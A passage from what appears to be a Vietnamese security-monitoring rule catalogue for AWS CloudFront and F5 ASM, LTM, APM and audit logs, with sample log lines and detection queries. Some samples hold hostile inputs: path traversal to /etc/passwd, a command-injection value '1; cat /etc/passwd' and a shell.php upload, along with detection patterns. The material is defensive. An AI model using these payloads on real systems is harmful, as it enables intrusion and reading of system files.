TID_2a3b4c5d6e7f8081 \"-\" \"-\" \"-\"","Lọc toàn bộ request có classification khác \"-\" (Ambiguous hoặc Severe) và theo dõi theo client_ip để phát hiện dò quét desync lặp lại.","SELECT time, client_ip, classification, classification_reason, elb_status_code\nFROM alb_logs\nWHERE classification IN ('Severe', 'Ambiguous')\nORDER BY time DESC LIMIT 100;"],

["aws-web","cf-attack-pattern-uri","CloudFront: Chuỗi tấn công trong URI/query string","m","T1190","Nhiều request tới CloudFront chứa chuỗi path traversal hoặc SQL injection trong cs-uri-stem/cs-uri-query và bị trả về sc-status 403/404 với x-edge-result-type=Error, cho thấy đang bị quét lỗ hổng trên ứng dụng phía sau CDN.","cs-uri-stem: đường dẫn request, chứa ../ hoặc đường dẫn hệ thống nhạy cảm\ncs-uri-query: chuỗi query, có thể chứa payload SQLi/XSS\nsc-status: 403/404 cho thấy bị từ chối hoặc không tìm thấy\nx-edge-result-type: \"Error\" khi response ở dải 4xx/5xx\ncs(User-Agent): thường là công cụ quét (sqlmap, nikto...)","2026-10-24 15:21:09 SIN2-C1 612 185.220.101.47 GET d2a1b2c3d4e5f6.cloudfront.net /../../etc/passwd 403 - sqlmap/1.7.11 - - Error 3AqrZGCnF_g0-5KOvfA7c9XLcf4YGvMFSeFdIetR1N_2y8jSis8Zxg== www.shop.example.com https 540 0.045 - TLSv1.3 TLS_AES_128_GCM_SHA256 Error HTTP/1.1 - - 51423 0.021 InvalidRequest text/html 345 - -","Lọc theo c-ip với số lượng lớn sc-status 403/404 kèm dấu hiệu payload trong cs-uri-stem hoặc cs-uri-query trong thời gian ngắn.","SELECT requestip, uri, querystring, status, count(*) AS hits\nFROM cloudfront_logs\nWHERE status IN (403, 404)\n  AND (uri LIKE '%..%' OR querystring LIKE '%UNION%' OR querystring LIKE '%<script%')\nGROUP BY requestip, uri, querystring, status\nORDER BY hits DESC LIMIT 50;"],

["aws-web","cf-signed-url-bypass","CloudFront: Dò quét truy cập nội dung riêng tư không có chữ ký hợp lệ","m","T1530","Nhiều request liên tiếp tới cùng đường dẫn nội dung riêng tư (yêu cầu signed URL/signed cookie) thiếu hoặc sai tham số chữ ký, bị trả về sc-status 403 với x-edge-detailed-result-type=InvalidRequestBlocked, cho thấy đang có nỗ lực truy cập trái phép dữ liệu lưu trữ qua CDN.","cs-uri-stem: đường dẫn nội dung riêng tư bị nhắm tới (ví dụ /private/...)\ncs-uri-query: thiếu hoặc sai Signature/Expires/Key-Pair-Id cần thiết\nsc-status: 403 cho thấy bị từ chối truy cập\nx-edge-detailed-result-type: InvalidRequestBlocked xác nhận bị chặn do chính sách truy cập\nc-ip: nguồn thực hiện nhiều lần thử với tham số khác nhau","2026-10-24 19:03:55 NRT57-C2 388 91.198.174.2 GET d2a1b2c3d4e5f6.cloudfront.net /private/employee-handbook.pdf 403 - Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64) Expires=1700000000&Signature=AbCd1234 - Error 1pkpNfBQ39sYMnjjUQjmH2w1wdJnbHYTbag21o_3OfcQgPzdL2RSSQ== docs.example.com https 410 0.012 - TLSv1.3 TLS_AES_128_GCM_SHA256 Error HTTP/2.0 - - 60221 0.009 InvalidRequestBlocked text/html 287 - -","Nhóm theo c-ip và cs-uri-stem, đếm số lần sc-status=403 với x-edge-detailed-result-type=InvalidRequestBlocked vượt ngưỡng trong khung thời gian ngắn.","SELECT requestip, uri, status, resulttype, count(*) AS attempts\nFROM cloudfront_logs\nWHERE uri LIKE '/private/%' AND status = 403\nGROUP BY requestip, uri, status, resulttype\nHAVING count(*) > 20\nORDER BY attempts DESC;"],

["f5-asm","Attack signature detected","Phát hiện chữ ký tấn công (Attack Signature)","c","T1190","ASM so khớp nội dung request/response với cơ sở dữ liệu chữ ký tấn công đã biết (SQL injection, XSS, command injection, path traversal...) và tạo vi phạm khi trùng khớp.","sig_ids: ID của chữ ký tấn công khớp\nsig_names: Tên chữ ký (vd. \"SQL-INJ generic\")\nattack_type: Loại tấn công được suy luận (SQL Injection, Cross Site Scripting...)\nrequest_status: Trạng thái xử lý (blocked/alerted/passed)\nsupport_id: Mã tham chiếu duy nhất để tra cứu chi tiết sự kiện\nseverity: Mức độ nghiêm trọng do policy gán cho chữ ký","ASM:unit_hostname=\"bigip1.corp.local\",policy_name=\"/Common/app_waf_policy\",violations=\"Attack signature detected\",sig_ids=\"200001624\",sig_names=\"SQL-INJ UNION SELECT statement\",attack_type=\"SQL Injection\",severity=\"Critical\",request_status=\"blocked\",response_code=\"0\",ip_client=\"203.0.113.45\",method=\"POST\",uri=\"/login.php\",support_id=\"5234567890123456789\"","Lọc các sự kiện có request_status=blocked/alerted kèm attack_type để tìm nguồn IP đang dò quét/khai thác ứng dụng web.","SIEM: index=f5_asm violations=\"Attack signature detected\" | stats count by sig_names, attack_type, ip_client | sort -count"],

["f5-asm","Illegal meta character in value","Ký tự meta không hợp lệ trong tham số/header","m","T1190","ASM phát hiện các ký tự đặc biệt (như ; | ` ' & $) không được phép xuất hiện trong giá trị tham số, header hay cookie theo policy, thường là dấu hiệu dò tìm lỗ hổng injection.","violations: Tên vi phạm (\"Illegal meta character in value\")\nparam_name / header_name: Tên tham số/header chứa ký tự vi phạm\nviolation_details hoặc request: Giá trị/ngữ cảnh chứa ký tự bất hợp lệ\nrequest_status: blocked/alerted/passed\nsrc_ip (ip_client): IP nguồn gửi request\nseverity: Mức log (thường \"Error\")","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"Illegal meta character in value\",violation_details=\"parameter name='id'; illegal value=\\\"1; cat /etc/passwd\\\"\",severity=\"Error\",request_status=\"blocked\",ip_client=\"198.51.100.22\",method=\"GET\",uri=\"/search\",support_id=\"5234567890123456800\"","Theo dõi tần suất ký tự meta bất thường từ cùng một IP/tham số để phát hiện dò quét command injection tự động.","SIEM: index=f5_asm violations=\"Illegal meta character*\" | stats count by ip_client, param_name | where count > 10"],

["f5-asm","Violation rating likely attack","Mức đánh giá vi phạm (Violation Rating) cho thấy khả năng cao là tấn công","h","T1190","ASM tổng hợp toàn bộ vi phạm trong một transaction để tính điểm Violation Rating từ 1 (gần như false positive) đến 5 (rất có thể là tấn công thật); các request đạt rating cao cần ưu tiên điều tra.","violation_rating: Điểm tổng hợp 1-5 đánh giá khả năng là tấn công thật\nviolations: Danh sách các vi phạm góp phần vào điểm số\nattack_type: Loại tấn công nghi ngờ (nếu có)\nrequest_status: blocked/alerted/passed\nsupport_id: Mã tra cứu chi tiết sự kiện\nip_client: IP nguồn request","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"Attack signature detected,Illegal meta character in value\",violation_rating=\"5\",attack_type=\"Command Execution\",request_status=\"blocked\",ip_client=\"203.0.113.77\",method=\"POST\",uri=\"/upload\",support_id=\"5234567890123456811\"","Ưu tiên điều tra ngay các request có violation_rating=4 hoặc 5, đặc biệt khi request_status không phải blocked.","SIEM: index=f5_asm violation_rating>=4 | table _time, ip_client, uri, violations, request_status | sort -violation_rating"],

["f5-asm","HTTP protocol compliance failed","Vi phạm tuân thủ giao thức HTTP","m","T1190","ASM phát hiện request không tuân thủ chuẩn RFC HTTP (ví dụ phiên bản HTTP sai, header Host trùng/thiếu, Content-Length không hợp lệ), thường bị lợi dụng để né tránh kiểm tra hoặc thực hiện request smuggling.","violations: Tên vi phạm (\"HTTP protocol compliance failed\")\nviolation_details: Loại lỗi RFC cụ thể (vd. \"Bad HTTP version\")\nrequest_status: blocked/alerted/passed\nmethod, protocol: Phương thức và phiên bản giao thức HTTP của request\nip_client: IP nguồn request\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"HTTP protocol compliance failed\",violation_details=\"Bad HTTP version\",request_status=\"blocked\",method=\"GET\",protocol=\"HTTP/0.9\",ip_client=\"192.0.2.90\",uri=\"/\",support_id=\"5234567890123456822\"","Tìm các cụm request lặp lại vi phạm RFC từ cùng nguồn, dấu hiệu công cụ quét tự động hoặc thử request smuggling.","SIEM: index=f5_asm violations=\"HTTP protocol compliance failed\" | stats count by ip_client, violation_details | sort -count"],

["f5-asm","Illegal file type upload","Loại tệp tải lên không hợp lệ","h","T1190","ASM chặn các tệp tải lên có phần mở rộng hoặc loại MIME không nằm trong danh sách cho phép của policy, thường nhằm ngăn chặn việc tải lên webshell hoặc mã thực thi.","violations: Tên vi phạm (\"Illegal file type\")\nfile_name / file_type: Tên tệp và loại tệp bị phát hiện\nrequest_status: blocked/alerted/passed (mặc định rating=5, thường block)\nuri: Endpoint nhận upload\nip_client: IP nguồn thực hiện upload\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"Illegal file type\",file_name=\"shell.php\",file_type=\"application/x-php\",request_status=\"blocked\",method=\"POST\",uri=\"/media/upload.php\",ip_client=\"198.51.100.201\",support_id=\"5234567890123456833\"","Rà soát mọi file_name có đuôi thực thi (.php, .jsp, .asp, .exe) bị chặn trên các endpoint upload để phát hiện nỗ lực cài webshell.","SIEM: index=f5_asm violations=\"Illegal file type\" | table _time, ip_client, uri, file_name, request_status"],

["f5-asm","Bot Defense automated client detected","Phát hiện client tự động (Bot Defense)","m","T1595.002","Bot Defense/Bot Signatures của ASM dùng thách thức JavaScript và chữ ký bot để nhận diện trình duyệt/client giả mạo hoặc công cụ tự động đang quét, thu thập dữ liệu hay rà soát ứng dụng.","bot_signature_name: Tên chữ ký bot khớp (vd. \"curl\", \"headless-browser\")\nbot_category / bot_anomalies: Phân loại bot (malicious/benign/unknown) hoặc bất thường phát hiện\nrequest_status (action): block/alarm/none theo cấu hình profile\nuser_agent: Chuỗi User-Agent của client\nip_client: IP nguồn của client\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",bot_signature_name=\"Scanner\",bot_category=\"Malicious Bot\",request_status=\"blocked\",user_agent=\"Mozilla/5.0 (compatible; Nmap Scripting Engine)\",ip_client=\"203.0.113.199\",uri=\"/\",support_id=\"5234567890123456844\"","Theo dõi các IP bị gắn bot_category=Malicious Bot lặp lại trên nhiều URI khác nhau trong thời gian ngắn, dấu hiệu dò quét tự động trước khi tấn công.","SIEM: index=f5_asm bot_category=\"Malicious Bot\" | stats dc(uri) as uris, count by ip_client | sort -uris"],

["f5-asm","Brute force attack detected","Phát hiện tấn công dò mật khẩu (Brute Force)","h","T1110","ASM phát hiện số lần đăng nhập thất bại hoặc tốc độ request tới trang login vượt ngưỡng cấu hình trong Brute Force/Login Attack protection, cho thấy nỗ lực dò mật khẩu hoặc credential stuffing.","violations / event: \"Brute Force Attack\" start/ongoing/stop\nlogin_url: URL trang đăng nhập bị tấn công\nip_client: IP nguồn (hoặc danh sách IP nếu phân tán)\nusername: Tên tài khoản bị thử (nếu session-based tracking bật)\nrequest_status (action): alarm/block theo cấu hình\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",event=\"Brute Force Attack started\",login_url=\"/portal/login\",ip_client=\"203.0.113.14\",username=\"admin\",request_status=\"blocked\",support_id=\"5234567890123456855\"","Tương quan sự kiện \"Brute Force Attack started\" với số lần đăng nhập thất bại trên cùng username/IP để phân biệt dò mật khẩu đơn lẻ và credential stuffing phân tán.","SIEM: index=f5_asm event=\"Brute Force Attack*\" | stats count by ip_client, login_url, username"],

["f5-asm","Evasion technique detected","Phát hiện kỹ thuật né tránh (Evasion)","h","","ASM phát hiện client cố tình dùng mã hóa/định dạng bất thường (directory traversal, unicode/double encoding, self-reference path...) nhằm né tránh việc kiểm tra chữ ký hoặc bộ lọc của WAF.","violations: Tên vi phạm (\"Evasion technique detected\")\nviolation_details: Kỹ thuật evasion cụ thể (vd. \"Directory traversal\", \"%u decoding\")\nrequest_status: blocked/alerted/passed\nuri / request: Đường dẫn/nội dung request chứa chuỗi evasion\nip_client: IP nguồn request\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"Evasion technique detected\",violation_details=\"Directory traversal\",request_status=\"blocked\",method=\"GET\",uri=\"/app/..%2f..%2f..%2fetc%2fpasswd\",ip_client=\"198.51.100.63\",support_id=\"5234567890123456866\"","Kết hợp vi phạm evasion với các vi phạm khác trong cùng request (thường đi kèm Attack signature detected) để xác định payload thật sự đứng sau lớp mã hóa.","SIEM: index=f5_asm violations=\"Evasion technique detected\" | table _time, ip_client, uri, violation_details, violations"],

["f5-asm","Request length exceeds buffer size","Độ dài request vượt quá bộ đệm cho phép","m","T1190","ASM chặn request/tham số/header có độ dài vượt giới hạn cấu hình trong policy, một dấu hiệu có thể là nỗ lực khai thác tràn bộ đệm (buffer overflow) hoặc DoS lớp ứng dụng.","violations: Tên vi phạm (\"Request length exceeds defined buffer size\")\nviolation_details: Thành phần vượt giới hạn (request/header/parameter) và độ dài thực tế\nrequest_status: blocked/alerted/passed\nmethod, uri: Phương thức và endpoint của request\nip_client: IP nguồn request\nsupport_id: Mã tra cứu chi tiết sự kiện","ASM:policy_name=\"/Common/app_waf_policy\",violations=\"Request length exceeds defined buffer size\",violation_details=\"header 'Cookie' length=9000 exceeds limit=8192\",request_status=\"blocked\",method=\"GET\",uri=\"/api/profile\",ip_client=\"192.0.2.150\",support_id=\"5234567890123456877\"","Đối chiếu các request bị chặn do vượt buffer với CVE tràn bộ đệm đã biết của ứng dụng/thư viện backend đang chạy sau WAF.","SIEM: index=f5_asm violations=\"Request length exceeds defined buffer size\" | stats count by ip_client, uri | sort -count"],

["f5-asm","ASM policy transparent or blocking disabled","Policy ASM ở chế độ Transparent / tắt chặn (blocking disabled)","c","T1562.004","Policy ASM được chuyển sang Enforcement Mode = Transparent hoặc các action Block bị tắt trên các vi phạm, khiến traffic tấn công chỉ bị ghi log (alert) mà không còn bị chặn thực sự — một dấu hiệu quan trọng của việc vô hiệu hóa phòng thủ.","policy_name: Tên policy bị thay đổi\nenforcement_mode: Giá trị hiện tại (Blocking/Transparent)\nrequest_status: alerted thay vì blocked dù vi phạm nghiêm trọng xảy ra\nviolation_rating/violations: Vi phạm đáng lẽ bị chặn nhưng chỉ được cảnh báo\nchanged_by (audit log /var/log/audit): Tài khoản thực hiện thay đổi cấu hình\nsupport_id: Mã tra cứu chi tiết sự kiện liên quan","ASM:policy_name=\"/Common/app_waf_policy\",enforcement_mode=\"Transparent\",violations=\"Attack signature detected\",violation_rating=\"5\",request_status=\"alerted\",ip_client=\"203.0.113.45\",uri=\"/login.php\",support_id=\"5234567890123456888\" ; audit: user=\"svc_waf_admin\" action=\"MODIFY\" object=\"asm policy /Common/app_waf_policy\" attribute=\"enforcement-mode\" old=\"blocking\" new=\"transparent\"","Cảnh báo ngay khi enforcement_mode chuyển sang Transparent hoặc action Block bị gỡ trên policy production, đặc biệt nếu xảy ra ngay trước một đợt tăng vi phạm nghiêm trọng request_status=alerted.","tmsh list security log profile and tmsh list asm policy /Common/app_waf_policy enforcement-mode ; SIEM audit log: object=\"asm policy*\" attribute=\"enforcement-mode\""],

["f5-ltm","ssl_handshake_fail","Lỗi bắt tay SSL/TLS","m","T1557","BIG-IP LTM ghi nhận lỗi trong quá trình bắt tay SSL/TLS (phiên bản giao thức không được hỗ trợ hoặc xác thực chứng chỉ thất bại), có thể là dấu hiệu quét dò cấu hình TLS yếu hoặc tấn công xen giữa (AiTM) chèn chứng chỉ giả mạo.","tmm<N>[PID]: tiến trình TMM xử lý phiên SSL ghi log\n01260009:4: mã thông điệp và mức cảnh báo (warning)\nssl_hs_rxhello / ssl_shim_vfycerterr: hàm SSL nơi phát sinh lỗi bắt tay\nunsupported version(<code>) / application verification failure(46): nguyên nhân cụ thể của lỗi\nclient_IP:client_port -> virtual_IP:virtual_port: nguồn kết nối và virtual server đích (có ở biến thể 01260013)","Oct 24 09:12:44 bigip01 warning tmm1[11382]: 01260009:4: Connection error: ssl_hs_rxhello:8519: unsupported version (70)","Theo dõi một IP nguồn gây nhiều lỗi bắt tay SSL liên tiếp trên nhiều virtual server khác nhau trong thời gian ngắn, dấu hiệu của công cụ quét TLS.","grep -E '01260009|01260013' /var/log/ltm | tail -n 100"],

["f5-ltm","pool_member_down","Thành viên pool bị đánh dấu down","h","","Health monitor của LTM phát hiện pool member không phản hồi đúng và chuyển trạng thái sang \"down\", làm giảm hoặc mất khả năng xử lý traffic của pool - cần loại trừ nguyên nhân là tấn công từ chối dịch vụ nhắm vào backend.","mcpd[PID]: tiến trình quản lý cấu hình ghi log sự kiện\n01070638:5: mã thông điệp và mức độ (notice)\nPool /Partition/poolname: pool chứa member bị ảnh hưởng\nmember IP:port: địa chỉ và cổng của pool member\nmonitor status down: trạng thái mới của member\nlast error: <monitor>: <lý do>: monitor nào fail và lý do cụ thể","Aug 13 05:42:02 bigip01 notice mcpd[7239]: 01070638:5: Pool /Common/pool_app_http member /Common/192.168.120.35:80 monitor status down. [ /Common/http_monitor: down; last error: /Common/http: No successful responses received before deadline. ]","Đối chiếu thời điểm pool member down với lưu lượng tăng đột biến hoặc log tường lửa để loại trừ khả năng DoS nhắm vào backend.","tmsh show ltm pool pool_app_http members detail"],

["f5-ltm","vs_disabled","Virtual server bị vô hiệu hóa qua thay đổi cấu hình","c","T1489","Một virtual server đang phục vụ traffic production bị người dùng vô hiệu hóa (disable), có thể là thao tác bảo trì hợp lệ hoặc hành vi phá hoại/chiếm quyền quản trị nhằm làm gián đoạn dịch vụ.","mcpd[PID]: tiến trình ghi nhận thay đổi cấu hình\n01070921:5: mã thông điệp và mức độ (notice)\nVirtual Server '/Partition/vsname': virtual server bị thay đổi\non partition 'Common': partition chứa đối tượng\nenabled/disabled: trạng thái mới được áp dụng\nby user '<username>': tài khoản thực hiện thay đổi","Oct 24 14:02:10 bigip01 notice mcpd[7239]: 01070921:5: Virtual Server /Common/vs_app_https on partition Common disabled by user jsmith_adm","Cảnh báo ngay khi một virtual server production bị disable ngoài cửa sổ bảo trì đã lên lịch, và đối chiếu với tài khoản thực hiện thay đổi.","grep '01070921' /var/log/ltm | tail -n 50"],

["f5-ltm","connlimit_reached","Đạt giới hạn kết nối trên virtual server","h","T1498","Số kết nối đồng thời tới một virtual server, pool member hoặc node đạt ngưỡng cấu hình, khiến BIG-IP từ chối kết nối mới - dấu hiệu điển hình của tấn công từ chối dịch vụ hoặc traffic bất thường.","tmm<N>[PID]: tiến trình TMM ghi nhận sự kiện\n01200012:4: mã thông điệp và mức cảnh báo (warning)\nclient_IP:client_port: nguồn của kết nối bị từ chối\nvirtual_IP:virtual_port: địa chỉ/cổng virtual server đích\nproto <6|17>: giao thức (TCP=6, UDP=17)\nVS <name>: đối tượng (virtual server) đã đạt giới hạn kết nối","Oct 24 10:03:21 bigip01 warning tmm2[11382]: 01200012:4: Warning, connections equals limit 203.0.113.44:51322 -> 198.51.100.10:443, proto 6, VS /Common/vs_app_https: Connection limit reached","Nếu một IP đơn lẻ hoặc dải IP nhỏ chiếm phần lớn số kết nối khi đạt giới hạn, nghi ngờ tấn công flood có chủ đích.","grep '01200012' /var/log/ltm | awk -F'Warning, connections equals limit ' '{print $2}' | awk -F':' '{print $1}' | sort | uniq -c | sort -rn"],

["f5-ltm","syncookie_dos","Kích hoạt SYN cookie / phát hiện SYN flood","c","T1498","BIG-IP phát hiện số lượng kết nối TCP half-open (embryonic) vượt ngưỡng và tự động bật chế độ SYN cookie để bảo vệ tài nguyên hệ thống - dấu hiệu rõ ràng của tấn công SYN flood.","tmm<N>[PID]: tiến trình TMM phát hiện và xử lý sự kiện\n01010240:5 / 01010241:5: mã thông điệp bật/tắt chế độ syncookie\nserver name = /Partition/vsname: virtual server bị ảnh hưởng\nHSB modId: module phần cứng xử lý syncookie\n01010055:4 Syncookie embryonic connection counter <count> exceeded sys threshold <threshold>: số kết nối half-open vượt ngưỡng hệ thống","Oct 24 10:05:02 bigip01 notice tmm1[11382]: 01010240:5: Syncookie HW mode activated, server name = /Common/vs_app_https, HSB modId = 0","Khi thấy syncookie được kích hoạt, kiểm tra ngay nguồn gốc traffic SYN đến virtual server tương ứng để xác định đây có phải SYN flood thật hay không.","grep -E '01010240|01010241|01010055' /var/log/ltm | tail -n 50"],

["f5-ltm","vs_rate_limit","Virtual server vượt giới hạn tốc độ kết nối","m","","Tốc độ kết nối mới tới một virtual server vượt ngưỡng rate-limit đã cấu hình, thường do một nguồn traffic tăng đột biến bất thường (bot, scraper, hoặc tấn công lớp ứng dụng).","tmm<N>[PID]: tiến trình TMM ghi nhận sự kiện vượt ngưỡng\n01010251:5: mã thông điệp cho virtual server vượt rate limit (01010250 dùng cho pool member)\nVirtual <name>: tên virtual server bị ảnh hưởng\nexceeded configured rate limit: nội dung cảnh báo","Oct 24 11:20:15 bigip01 notice tmm3[11382]: 01010251:5: Virtual /Common/vs_app_https exceeded configured rate limit.","Tra log kết nối cùng thời điểm để xác định IP nguồn chiếm phần lớn connections-per-second gây vượt ngưỡng.","grep '01010251' /var/log/ltm | tail -n 50"],

["f5-apm","apm_login_success","Đăng nhập VPN/SSO thành công qua APM","i","T1133","Access Policy xác thực thành công người dùng và cấp phiên truy cập từ xa (Network Access/Portal Access/Webtop), cần đối chiếu với baseline để phát hiện bất thường.","session.logon.last.result: kết quả đăng nhập cuối (1 = thành công)\nsession.user.name: tên người dùng đã xác thực\nsession.client.ip: địa chỉ IP nguồn của client\nsession.ad.last.actualdomain: domain AD thực tế dùng để xác thực\nsession.policy.result: kết quả Access Policy (allowed)\nAccess Policy session ID: định danh phiên APM (ví dụ cd2cabf4)","Oct 24 08:12:05 bigip-apm01 apmd[15569]: 01490102:5: /Common/ap_corp_vpn:Common:cd2cabf4: Username 'jdoe', AD domain 'CORP', Access Policy result: allowed, client IP 203.0.113.45","Gắn session ID với địa chỉ IP nguồn và so sánh khung giờ đăng nhập với hành vi thường lệ của người dùng để phát hiện tài khoản bị chiếm dụng.","tmsh show apm access-policy active-sessions field-fmt | grep jdoe ; grep 'allowed' /var/log/apm | grep 'jdoe'"],

["f5-apm","apm_login_failed","Đăng nhập APM thất bại / bị từ chối","m","T1110","Access Policy ghi nhận xác thực thất bại (sai mật khẩu, tài khoản AD/LDAP bị khóa...), nhiều lần thất bại liên tiếp từ cùng IP hoặc nhắm vào nhiều tài khoản có thể là dấu hiệu dò mật khẩu.","session.logon.last.result: kết quả đăng nhập cuối (0 = thất bại)\nsession.logon.last.attempts: số lần thử đăng nhập trong phiên\nsession.user.name: tên tài khoản được thử đăng nhập\nsession.client.ip: địa chỉ IP nguồn\nsession.ad.last.attempts: số lần thử xác thực AD\nsession.policy.result: kết quả Access Policy (access_denied)","Oct 24 09:41:17 bigip-apm01 apmd[15569]: 01490102:5: /Common/ap_corp_vpn:Common:a1f03e9d: Username 'jdoe', AD authentication failed (bad password), attempts=4, Access Policy result: access_denied, client IP 198.51.100.77","Lọc theo session.client.ip hoặc dải IP với số lần session.logon.last.attempts cao bất thường trong thời gian ngắn, trải trên nhiều tài khoản khác nhau.","grep 'access_denied' /var/log/apm | awk -F\"client IP \" '{print $2}' | sort | uniq -c | sort -rn"],

["f5-apm","apm_mfa_cert_fail","Xác thực đa yếu tố / chứng chỉ client thất bại","h","T1078","Người dùng vượt qua bước xác thực mật khẩu đầu tiên nhưng thất bại ở bước MFA hoặc kiểm tra chứng chỉ client (On-Demand Cert Auth), gợi ý kẻ tấn công đang dùng thông tin đăng nhập hợp lệ bị đánh cắp.","session.logon.last.result: kết quả bước xác thực đầu (1 = thành công)\nsession.ssl.cert.x509extension: thông tin chứng chỉ X.509 của client (rỗng/không hợp lệ nếu thất bại)\nsession.user.name: tên người dùng\nsession.client.ip: địa chỉ IP nguồn\nAccess Policy agent: tên nhánh kiểm tra MFA/Cert Auth bị rẽ sang Deny\nsession.policy.result: kết quả Access Policy (access_denied)","Oct 24 10:05:51 bigip-apm01 apmd[15569]: 01490102:5: /Common/ap_corp_vpn:Common:7b2cde31: Username 'jdoe' passed AD auth, Client Cert Auth agent: no valid certificate presented, Access Policy result: access_denied, client IP 203.0.113.210","Theo dõi các phiên vượt qua bước mật khẩu nhưng liên tục thất bại ở bước MFA/Cert trong thời gian ngắn, đặc biệt từ IP hoặc thiết bị lạ.","grep 'Client Cert Auth agent' /var/log/apm | grep 'access_denied'"],

["f5-apm","apm_posture_check_fail","Kiểm tra tình trạng thiết bị (posture check) thất bại","m","","Access Policy từ chối phiên vì thiết bị không đạt yêu cầu bảo mật (thiếu antivirus/firewall, sai bản vá), thường do thiết bị cá nhân không quản lý hoặc bị vô hiệu hóa phần mềm bảo vệ nhằm lách kiểm soát.","session.check_software.last.av.count: số phần mềm antivirus phát hiện trên máy\nsession.check_software.last.av.item_1.state: trạng thái antivirus (bật/tắt)\nsession.windows_check_process.last.result: kết quả kiểm tra tiến trình bắt buộc\nsession.user.name: tên người dùng\nsession.client.ip: địa chỉ IP nguồn\nsession.policy.result: kết quả Access Policy (access_denied)","Oct 24 11:22:40 bigip-apm01 apmd[15569]: 01490102:5: /Common/ap_corp_vpn:Common:93dd10aa: Username 'jdoe', Antivirus Check agent: av.count=0, Access Policy result: access_denied, client IP 192.0.2.88","So sánh tỷ lệ thất bại posture check theo người dùng/thiết bị theo thời gian; tăng đột biến hoặc lặp lại liên tục từ một tài khoản đáng để điều tra.","grep 'Antivirus Check agent' /var/log/apm | grep 'access_denied' | grep 'jdoe'"],

["f5-apm","apm_geo_anomaly","Đăng nhập từ quốc gia bất thường / di chuyển bất khả thi","h","T1078","IP Geolocation Match trong Access Policy phát hiện phiên đăng nhập đến từ quốc gia có rủi ro cao hoặc từ hai vị trí địa lý không thể di chuyển kịp trong khoảng thời gian giữa hai phiên, cho thấy khả năng tài khoản bị chiếm dụng.","session.user.ipgeolocation.country_name: tên quốc gia xác định từ IP client\nsession.user.ipgeolocation.country_code: mã quốc gia\nsession.client.ip: địa chỉ IP nguồn của phiên\nsession.user.name: tên người dùng\nsession.logon.last.result: kết quả xác thực (1 = thành công dù vị trí bất thường)\nAccess Policy agent: nhánh IP Geolocation Match rẽ nhánh Deny/cảnh báo","Oct 24 13:47:02 bigip-apm01 apmd[15569]: 01490102:5: /Common/ap_corp_vpn:Common:4e71bc02: Username 'jdoe', IP Geolocation Match agent: country_code=KP, Access Policy result: access_denied, client IP 203.0.113.9","So khớp session.user.ipgeolocation.country_code và session.client.ip của các phiên liên tiếp cùng tài khoản để phát hiện khoảng cách/thời gian di chuyển không khả thi.","grep 'IP Geolocation Match agent' /var/log/apm | grep -v 'country_code=VN'"],

["f5-apm","apm_concurrent_session_limit","Vượt giới hạn số phiên đồng thời của người dùng","m","T1078","APM từ chối phiên mới vì tài khoản đã đạt số phiên đồng thời tối đa (Max Sessions Per User) hoặc giới hạn license toàn hệ thống, có thể là dấu hiệu chia sẻ/dùng chung thông tin đăng nhập hoặc tài khoản bị xâm nhập song song.","session.user.name: tên tài khoản bị chặn do vượt giới hạn phiên\nsession.client.ip: địa chỉ IP nguồn của yêu cầu phiên mới\nMax Sessions Per User: số phiên hiện có so với giới hạn cấu hình\nAccess Policy result: kết quả bị từ chối do giới hạn phiên\nsession ID của các phiên đang hoạt động (session.assigned.uuid)","Oct 24 14:03:55 bigip-apm01 tmm1[10186]: 01490508:4: Username 'jdoe' exceeded Max Sessions Per User (limit=2, active=2), new session rejected, client IP 198.51.100.200","Khi một tài khoản liên tục chạm giới hạn phiên đồng thời từ các IP/địa điểm khác nhau trong thời gian ngắn, cần xác minh trực tiếp với người dùng và rà soát các phiên đang mở.","tmsh show apm access-policy active-sessions | grep -A2 jdoe"],

["f5-audit","f5-audit-new-admin-user","Tạo tài khoản admin mới","h","T1136.001","Một tài khoản auth user mới được tạo trên BIG-IP với vai trò Administrator trên tất cả các partition, cho phép toàn quyền quản trị thiết bị.","client: nguồn thực hiện thay đổi (tmsh = CLI, tmui = giao diện web)\nuser: tài khoản đã đăng nhập thực hiện lệnh tạo user\ntransaction: mã giao dịch cấu hình (#id-n), dùng để gom các thay đổi cùng lúc\ncreate { auth_user {...} }: đối tượng được tạo là auth_user kèm tên\nauth_user_partition_access / role: partition và vai trò được gán (vd role admin = toàn quyền)\nStatus: kết quả thực thi lệnh (Command OK/fail)","Oct 24 09:14:02 bigip01.corp.local notice mcpd[6817]: 01070417:5: AUDIT - client tmsh, user root - transaction #3348210-2 - object 0 - create { auth_user { name \"svc_backup2\" auth_user_partition_access { all-partitions { role admin } } shell \"bash\" } } [Status=Command OK]","Đối chiếu mọi tài khoản admin mới được tạo ngoài giờ bảo trì hoặc không qua yêu cầu thay đổi (change request) đã phê duyệt.","grep 'create { auth_user' /var/log/audit | grep 'role admin'"],

["f5-audit","f5-audit-role-privesc","Leo thang quyền qua đổi role người dùng","c","T1098","Vai trò (role) của một tài khoản hiện có bị thay đổi sang Administrator, nâng quyền từ mức hạn chế (operator, guest, manager...) lên toàn quyền.","client: tmsh hoặc tmui thực hiện thay đổi\nuser: tài khoản thực hiện lệnh modify (không nhất thiết là chủ tài khoản bị đổi role)\ntransaction: mã giao dịch cấu hình\nmodify { auth_user { name ... } }: tên tài khoản đích bị sửa\nauth_user_partition_access / role: role mới được gán cho tài khoản đích\nStatus: kết quả thực thi lệnh","Oct 24 11:02:47 bigip01.corp.local notice mcpd[6817]: 01070417:5: AUDIT - client tmui, user jdoe - transaction #3348551-3 - object 0 - modify { auth_user { name \"operator1\" auth_user_partition_access { all-partitions { role admin } } } } [Status=Command OK]","Tìm các dòng modify auth_user có role chuyển thành admin mà user thực hiện khác với chủ tài khoản hoặc không trùng quy trình cấp quyền chuẩn.","grep 'modify { auth_user' /var/log/audit | grep 'role admin'"],

